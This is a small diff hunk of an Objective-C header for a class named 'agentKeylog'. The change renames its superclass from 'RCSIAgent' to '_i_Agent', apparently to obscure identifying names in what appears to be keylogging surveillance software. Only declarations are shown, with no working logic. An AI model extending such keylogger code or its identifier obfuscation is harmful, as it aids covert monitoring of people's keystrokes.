@@ -13,7 +13,7 @@
 
 #define KEY_MAX_BUFFER_SIZE   0x10
 
-@interface agentKeylog : RCSIAgent
+@interface agentKeylog : _i_Agent
 {
   NSMutableString *mBufferString;
   BOOL mContextHasBeenSwitched;
